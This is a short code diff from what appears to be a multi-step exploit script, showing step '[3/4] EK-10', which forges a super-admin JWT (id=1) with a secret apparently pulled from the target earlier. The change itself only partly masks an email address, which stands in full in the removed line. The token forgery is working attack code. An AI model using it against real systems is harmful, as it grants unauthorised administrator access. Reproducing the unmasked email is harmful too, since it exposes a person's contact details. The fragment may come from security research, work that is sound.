@@ -45,7 +45,7 @@ def main():
 
     print("[3/4] EK-10: forgery JWT super-admin (id=1)")
     now = int(time.time())
-    tok = pyjwt.encode({"id": 1, "email": "1226028048@qq.com", "user_source": "admin_web",
+    tok = pyjwt.encode({"id": 1, "email": "122602****@qq.com", "user_source": "admin_web",
                         "login_method": "mail_code", "iat": now, "exp": now + 300},
                        secret.group(1), algorithm="HS256")
 
